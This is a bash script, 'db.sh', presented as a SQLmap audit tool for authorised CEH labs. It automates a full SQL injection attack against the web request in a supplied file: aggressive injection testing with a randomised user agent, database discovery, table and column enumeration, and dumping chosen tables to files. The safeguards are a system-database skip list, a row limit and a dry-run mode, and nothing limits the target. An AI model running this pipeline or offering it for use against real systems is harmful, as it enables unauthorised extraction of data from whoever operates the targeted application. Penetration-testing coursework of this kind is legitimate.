
#!/usr/bin/env bash
# db.sh - Automated SQLmap Database Audit Tool
# For authorized CEH labs and systems only.

set -Eeuo pipefail
umask 077

# --- Configuration ---

SQLMAP_PATH="/usr/bin/sqlmap"
DEFAULT_OUTPUT_DIR="sqlmap_audit_$(date +%Y%m%d_%H%M%S)"
CONFIG_FILE=""
DRY_RUN=false
EXPORT_SCOPE=""
ROW_LIMIT=100
EXPORT_FORMAT="CSV"

REQUEST_FILE=""
OUTPUT_DIR=""
SELECTED_DB=""
SQLMAP_LAST_OUTPUT=""
STARTED_AT="$(date '+%Y-%m-%d %H:%M:%S')"

ASSESSMENT_STATUS="NOT_RUN"
DATABASE_STATUS="NOT_RUN"
TABLE_STATUS="NOT_RUN"
COLUMN_STATUS="NOT_RUN"
EXPORT_STATUS="NOT_RUN"

# System databases that must not be selected or enumerated.
SYSTEM_DATABASES=(
    information_schema
    mysql
    performance_schema
    sys
)

# --- Logging ---

function log_info() {
    printf '[INFO] %s\n' "$*"
}

function log_warn() {
    printf '[WARN] %s\n' "$*" >&2
}

function log_error() {
    printf '[ERROR] %s\n' "$*" >&2
}

function log_done() {
    printf '[DONE] %s\n' "$*"
}

function die() {
    log_error "$*"
    exit 1
}

function usage() {
    cat <<'USAGE'
Usage:
  ./db.sh REQUEST_FILE [options]

Options:
  --output DIR             Output directory
  --config FILE            Configuration file
  --dry-run                Skip actual data exports
  --export-scope SCOPE     Explicit scope: db:DATABASE:TABLE[,db:DATABASE:TABLE]
  --row-limit N            Maximum rows per exported table (default: 100)
  --export-format FORMAT   CSV, HTML, or SQLITE
  --help                   Show help

Use FIRST as the database name in an export scope to refer to
the first discovered non-system database.

Example:
  ./db.sh req.txt --output results
  ./db.sh req.txt --export-scope 'db:FIRST:users' --row-limit 100
  ./db.sh req.txt --dry-run --export-scope 'db:FIRST:users'

Configuration file format (KEY=VALUE):
  SQLMAP_PATH=/usr/bin/sqlmap
  OUTPUT_DIR=/home/attacker/ceh-results
  DRY_RUN=true
  EXPORT_SCOPE=db:FIRST:users
  ROW_LIMIT=100
  EXPORT_FORMAT=CSV
USAGE
    exit 0
}

# --- Configuration parsing ---

function trim_value() {
    local value="$1"
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    printf '%s' "$value"
}

function load_config() {
    local config_file="$1"
    local line key value

    [[ -f "$config_file" && -r "$config_file" ]] ||
        die "Configuration file is missing or unreadable: $config_file"

    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"
        [[ "$line" =~ ^[[:space:]]*$ ]] && continue

        [[ "$line" == *=* ]] ||
            die "Invalid configuration line: $line"

        key="$(trim_value "${line%%=*}")"
        value="$(trim_value "${line#*=}")"

        case "$key" in
            SQLMAP_PATH)   SQLMAP_PATH="$value" ;;
            OUTPUT_DIR)    OUTPUT_DIR="$value" ;;
            DRY_RUN)       DRY_RUN="$value" ;;
            EXPORT_SCOPE)  EXPORT_SCOPE="$value" ;;
            ROW_LIMIT)     ROW_LIMIT="$value" ;;
            EXPORT_FORMAT) EXPORT_FORMAT="$value" ;;
            *)
                die "Unknown configuration key: $key"
                ;;
        esac
    done < "$config_file"
}

# Load config first, then let command-line options override it.
ARGS=("$@")

for ((i=0; i<${#ARGS[@]}; i++)); do
    if [[ "${ARGS[i]}" == "--config" ]]; then
        (( i + 1 < ${#ARGS[@]} )) ||
            die "--config requires a filename."
        CONFIG_FILE="${ARGS[i+1]}"
    fi
done

if [[ -n "$CONFIG_FILE" ]]; then
    load_config "$CONFIG_FILE"
fi

while (($#)); do
    case "$1" in
        --output)
            (($# >= 2)) || die "--output requires a directory."
            OUTPUT_DIR="$2"
            shift 2
            ;;
        --config)
            (($# >= 2)) || die "--config requires a filename."
            shift 2
            ;;
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --export-scope)
            (($# >= 2)) || die "--export-scope requires a value."
            EXPORT_SCOPE="$2"
            shift 2
            ;;
        --row-limit)
            (($# >= 2)) || die "--row-limit requires a number."
            ROW_LIMIT="$2"
            shift 2
            ;;
        --export-format)
            (($# >= 2)) || die "--export-format requires a format."
            EXPORT_FORMAT="$2"
            shift 2
            ;;
        --help|-h)
            usage
            ;;
        -*)
            die "Unknown option: $1"
            ;;
        *)
            [[ -z "$REQUEST_FILE" ]] ||
                die "Unexpected extra argument: $1"
            REQUEST_FILE="$1"
            shift
            ;;
    esac
done

[[ -n "$REQUEST_FILE" ]] ||
    die "Request file not specified. Use --help for usage."

# --- Dependency checks ---

function check_dependencies() {
    if [[ ! -x "$SQLMAP_PATH" ]]; then
        SQLMAP_PATH="$(command -v sqlmap || true)"
    fi

    [[ -n "$SQLMAP_PATH" && -x "$SQLMAP_PATH" ]] ||
        die "SQLmap executable not found. Check SQLMAP_PATH."

    command -v realpath >/dev/null 2>&1 ||
        die "Required command not found: realpath"

    log_info "SQLmap executable: $SQLMAP_PATH"
}

# --- Validate request file ---

function validate_request_file() {
    local file="$1"

    [[ -f "$file" ]] || die "Request file not found: $file"
    [[ -r "$file" ]] || die "Request file is not readable: $file"
    [[ -s "$file" ]] || die "Request file is empty: $file"

    REQUEST_FILE="$(realpath "$file")"
    log_info "Validated request file: $REQUEST_FILE"
}

# --- Prepare output directory ---

function prepare_output_directory() {
    OUTPUT_DIR="${OUTPUT_DIR:-$DEFAULT_OUTPUT_DIR}"

    mkdir -p -- "$OUTPUT_DIR" ||
        die "Cannot create output directory: $OUTPUT_DIR"

    OUTPUT_DIR="$(realpath "$OUTPUT_DIR")"
    log_info "Results directory: $OUTPUT_DIR"
}

# --- Run SQLmap ---
# Output is captured in memory and displayed in the terminal.
# No custom error-log file is created.

function run_sqlmap() {
    local status=0
    local output=""

    if output="$("$SQLMAP_PATH" \
        --batch \
        --disable-coloring \
        "--output-dir=$OUTPUT_DIR" \
        "$@" 2>&1)"; then
        SQLMAP_LAST_OUTPUT="$output"
        [[ -z "$output" ]] || printf '%s\n' "$output"
        return 0
    else
        status=$?
        SQLMAP_LAST_OUTPUT="$output"
        [[ -z "$output" ]] || printf '%s\n' "$output"
        return "$status"
    fi
}

function run_stage() {
    local stage="$1"
    shift

    log_info "Starting stage: $stage"

    if run_sqlmap "$@"; then
        log_info "Stage completed: $stage"
        return 0
    else
        local status=$?
        log_error "$stage failed with exit code $status."
        return "$status"
    fi
}

# --- Initial assessment ---

function sqlmap_assessment() {
    log_info "Starting SQL injection assessment..."

    run_stage "SQL injection assessment" \
        -r "$REQUEST_FILE" \
        --dbms=MySQL \
        --level=5 \
        --risk=3 \
        --random-agent
}

# --- Check for system databases ---

function is_system_database() {
    local candidate="${1,,}"
    local system_db

    for system_db in "${SYSTEM_DATABASES[@]}"; do
        if [[ "$candidate" == "$system_db" ]]; then
            return 0
        fi
    done

    return 1
}

# --- Discover databases and choose the first non-system DB ---

function discover_databases() {
    local database
    local -a discovered=()
    local -a non_system=()

    log_info "Discovering databases..."

    if ! run_stage "Database discovery" \
        -r "$REQUEST_FILE" \
        --dbs; then
        DATABASE_STATUS="FAILED"
        return 1
    fi

    mapfile -t discovered < <(
        printf '%s\n' "$SQLMAP_LAST_OUTPUT" |
        awk '
            /available databases[[:space:]]*\[[0-9]+\]:/ {
                inlist=1
                next
            }
            inlist && /^[[:space:]]*\[\*\][[:space:]]*/ {
                sub(/^[[:space:]]*\[\*\][[:space:]]*/, "")
                if (length($0)) print
                next
            }
            inlist && /^[[:space:]]*$/ { next }
            inlist { exit }
        '
    )

    if ((${#discovered[@]} == 0)); then
        DATABASE_STATUS="FAILED"
        log_error "Could not parse a database list from SQLmap output."
        log_warn "The output format may differ, or no database list was returned."
        return 1
    fi

    log_info "Databases reported by SQLmap:"

    for database in "${discovered[@]}"; do
        if is_system_database "$database"; then
            log_info "Skipping system database: $database"
        else
            non_system+=("$database")
            log_info "Application database: $database"
        fi
    done

    if ((${#non_system[@]} == 0)); then
        DATABASE_STATUS="FAILED"
        log_error "No non-system databases were discovered."
        return 1
    fi

    # Keep the first non-system database in SQLmap's reported order.
    SELECTED_DB="${non_system[0]}"
    DATABASE_STATUS="SUCCESS"

    log_info "Selected first non-system database: $SELECTED_DB"
}

# --- Enumerate tables in the selected database ---

function enumerate_tables() {
    [[ -n "$SELECTED_DB" ]] ||
        die "Cannot enumerate tables: no non-system database selected."

    log_info "Enumerating tables in: $SELECTED_DB"

    run_stage "Table enumeration" \
        -r "$REQUEST_FILE" \
        -D "$SELECTED_DB" \
        --tables
}

# --- Enumerate columns in the selected database ---

function enumerate_columns() {
    [[ -n "$SELECTED_DB" ]] ||
        die "Cannot enumerate columns: no non-system database selected."

    log_info "Enumerating columns in: $SELECTED_DB"

    run_stage "Column enumeration" \
        -r "$REQUEST_FILE" \
        -D "$SELECTED_DB" \
        --columns
}

# --- Export explicitly scoped tables only ---

function export_data() {
    local export_scope="$1"
    local row_limit="$2"
    local export_format="$3"

    if [[ -z "$export_scope" ]]; then
        EXPORT_STATUS="SKIPPED"
        log_warn "No export scope specified; skipping export."
        return 0
    fi

    local -a items=()
    local item kind database table extra

    IFS=',' read -r -a items <<< "$export_scope"

    for item in "${items[@]}"; do
        IFS=':' read -r kind database table extra <<< "$item"

        if [[ "$kind" != "db" ||
              -z "${database:-}" ||
              -z "${table:-}" ||
              -n "${extra:-}" ]]; then
            log_error "Invalid export scope '$item'. Expected db:DATABASE:TABLE."
            EXPORT_STATUS="FAILED"
            return 1
        fi

        if [[ "$database" == "FIRST" ]]; then
            [[ -n "$SELECTED_DB" ]] ||
                die "FIRST requested but no non-system database was selected."
            database="$SELECTED_DB"
        fi

        if is_system_database "$database"; then
            log_error "Refusing export from system database: $database"
            EXPORT_STATUS="FAILED"
            return 1
        fi

        log_info "Export scope: $database.$table (row limit: $row_limit)"

        if [[ "$DRY_RUN" == true ]]; then
            log_info "Dry run: skipping export of $database.$table"
            continue
        fi

        if ! run_stage "Export $database.$table" \
            -r "$REQUEST_FILE" \
            --random-agent \
            -D "$database" \
            -T "$table" \
            --dump \
            "--limit=$row_limit" \
            "--dump-format=$export_format"; then
            EXPORT_STATUS="FAILED"
            return 1
        fi
    done

    if [[ "$DRY_RUN" == true ]]; then
        EXPORT_STATUS="DRY_RUN"
    else
        EXPORT_STATUS="SUCCESS"
    fi

    log_info "Export-scope processing completed."
}

# --- Generate report ---

function generate_report() {
    local overall_status="$1"
    local report_file="$OUTPUT_DIR/report.txt"
    local finished_at

    finished_at="$(date '+%Y-%m-%d %H:%M:%S')"

    {
        printf 'SQLmap Database Audit Report\n'
        printf '%s\n' '========================================'
        printf 'Started: %s\n' "$STARTED_AT"
        printf 'Finished: %s\n' "$finished_at"
        printf 'Overall status: %s\n' "$overall_status"
        printf 'Request file: %s\n' "$REQUEST_FILE"
        printf 'SQLmap executable: %s\n' "$SQLMAP_PATH"
        printf 'Selected database: %s\n' "${SELECTED_DB:-Not selected}"
        printf 'Output directory: %s\n' "$OUTPUT_DIR"
        printf '\nStage statuses:\n'
        printf '  Assessment: %s\n' "$ASSESSMENT_STATUS"
        printf '  Database discovery: %s\n' "$DATABASE_STATUS"
        printf '  Table enumeration: %s\n' "$TABLE_STATUS"
        printf '  Column enumeration: %s\n' "$COLUMN_STATUS"
        printf '  Data export: %s\n' "$EXPORT_STATUS"
        printf '\n'
        printf '%s\n' 'This report records stage statuses, not raw error output.'
    } > "$report_file"

    log_info "Report generated: $report_file"
}

# --- Main workflow ---

function main() {
    local overall_status="SUCCESS"

    check_dependencies
    validate_request_file "$REQUEST_FILE"
    prepare_output_directory

    if sqlmap_assessment; then
        ASSESSMENT_STATUS="SUCCESS"
    else
        ASSESSMENT_STATUS="FAILED"
        generate_report "FAILED"
        die "Assessment failed; review the terminal output."
    fi

    if ! discover_databases; then
        generate_report "FAILED"
        die "Database discovery failed; review the terminal output."
    fi

    if enumerate_tables; then
        TABLE_STATUS="SUCCESS"
    else
        TABLE_STATUS="FAILED"
        generate_report "FAILED"
        die "Table enumeration failed; review the terminal output."
    fi

    if enumerate_columns; then
        COLUMN_STATUS="SUCCESS"
    else
        COLUMN_STATUS="FAILED"
        generate_report "FAILED"
        die "Column enumeration failed; review the terminal output."
    fi

    if ! export_data "$EXPORT_SCOPE" "$ROW_LIMIT" "$EXPORT_FORMAT"; then
        overall_status="PARTIAL_FAILURE"
        generate_report "$overall_status"
        die "Export failed; review the terminal output."
    fi

    generate_report "$overall_status"
    log_done "Assessment workflow finished."
    log_info "Results directory: $OUTPUT_DIR"
}

# --- Validate settings ---

[[ "$DRY_RUN" == true || "$DRY_RUN" == false ]] ||
    die "DRY_RUN must be true or false."

[[ "$ROW_LIMIT" =~ ^[1-9][0-9]*$ ]] ||
    die "ROW_LIMIT must be a positive integer."

EXPORT_FORMAT="${EXPORT_FORMAT^^}"

case "$EXPORT_FORMAT" in
    CSV|HTML|SQLITE) ;;
    *) die "EXPORT_FORMAT must be CSV, HTML, or SQLITE." ;;
esac

main
